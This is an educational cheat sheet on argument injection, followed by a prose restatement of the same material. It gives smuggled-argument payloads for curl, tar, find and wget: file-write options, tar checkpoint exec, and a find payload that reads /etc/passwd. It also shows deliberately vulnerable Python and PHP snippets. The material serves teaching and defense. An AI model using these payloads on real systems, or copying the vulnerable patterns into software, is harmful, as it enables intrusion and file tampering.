# Argument Injection
Argument injection is similar to command injection as tainted data is passed to to a command executed in a shell without proper sanitization/escaping.

It can happen in different situations, where you can only inject arguments to a command:

- Improper sanitization (regex)
- Injection of arguments into a fixed command (PHP:escapeshellcmd, Python: Popen)
- Bash expansion (ex: *)

In the following example, a python script takes the inputs from the command line to generate a ```curl``` command:
```py
from shlex import quote,split
import sys
import subprocess

if __name__=="__main__":
    command = ['curl']
    command = command + split(sys.argv[1])
    print(command)
    r = subprocess.Popen(command)
```
It is possible for an attacker to pass several words to abuse options from ```curl``` command
```ps1
python python_rce.py "https://www.google.fr -o test.py" 
```
We can see by printing the command that all the parameters are splited allowing to inject an argument that will save the response in an arbitrary file.
```ps1
['curl', 'https://www.google.fr', '-o', 'test.py']
```
## Summary

* [List of exposed commands](#list-of-exposed-commands)
  * [CURL](#CURL)
  * [TAR](#TAR)
  * [FIND](#FIND)
  * [WGET](#WGET)
* [References](#references)


## List of exposed commands

### CURL
It is possible to abuse ```curl``` through the following options:

```ps1
 -o, --output <file>        Write to file instead of stdout
 -O, --remote-name          Write output to a file named as the remote file
```
In case there is already one option in the command it is possible to inject several URLs to download and several output options. Each option will affect each URL in sequence.

### TAR
For the ```tar``` command it is possible to inject arbitrary arguments in different commands. 

Argument injection can happen into the '''extract''' command:
```ps1
--to-command <command>
--checkpoint=1 --checkpoint-action=exec=<command>
-T <file> or --files-from <file>
```

Or in the '''create''' command:
```ps1
-I=<program> or -I <program>
--use-compres-program=<program>
```
There are also short options to work without spaces:
```ps1
-T<file>
-I"/path/to/exec"
```

### FIND
Find some_file inside /tmp directory.
```php
$file = "some_file";
system("find /tmp -iname ".escapeshellcmd($file));
```

Print /etc/passwd content.
```php
$file = "sth -or -exec cat /etc/passwd ; -quit";
system("find /tmp -iname ".escapeshellcmd($file));
```

### WGET
Example of vulnerable code
```php
system(escapeshellcmd('wget '.$url));
```
Arbitrary file write
```php
$url = '--directory-prefix=/var/www/html http://example.com/example.php';
```


## References

- [staaldraad - Etienne Stalmans, November 24, 2019](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
- [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic, 06/25/2014](https://www.exploit-db.com/papers/33930)
- [TL;DR: How exploit/bypass/use PHP escapeshellarg/escapeshellcmd functions - kacperszurek,  Apr 25, 2018](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



Argument injection is a security vulnerability that occurs when untrusted data is passed to a command executed in a shell without proper sanitization or escaping. This vulnerability can lead to unauthorized command execution and potential compromise of the system.

In the provided Python script example, the script takes input from the command line and constructs a `curl` command using the `subprocess.Popen` function. However, the script does not properly sanitize or escape the input, which makes it vulnerable to argument injection attacks.

Here's how an attacker can exploit this vulnerability:

```ps1
python python_rce.py "https://www.google.fr -o test.py"
```

In this command, the attacker passes multiple words as input, including options for `curl` (`-o test.py`). The lack of proper sanitization allows these options to be injected into the `curl` command generated by the script.

The resulting command becomes:

```ps1
['curl', 'https://www.google.fr', '-o', 'test.py']
```

This means that the attacker can inject additional arguments to the `curl` command, such as `-o` to specify an output file, potentially leading to the creation of arbitrary files on the system.

### List of Exposed Commands

#### CURL
The `curl` command can be abused through options like `-o` (write to file) and `-O` (write output to a file named as the remote file), allowing attackers to manipulate file outputs.

#### TAR
In the `tar` command, injection can occur in the `extract` and `create` commands, as well as through short options that work without spaces. This can lead to arbitrary command execution and file manipulation.

#### FIND
The `find` command can be abused to execute arbitrary commands, such as searching for files (`find /tmp -iname`) or printing sensitive files (`-exec cat /etc/passwd`).

#### WGET
The `wget` command is vulnerable to arbitrary file write attacks when used without proper sanitization (`wget '.$url`).

### References

- [staaldraad - Etienne Stalmans, November 24, 2019](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
- [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic, 06/25/2014](https://www.exploit-db.com/papers/33930)
- [TL;DR: How exploit/bypass/use PHP escapeshellarg/escapeshellcmd functions - kacperszurek, Apr 25, 2018](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)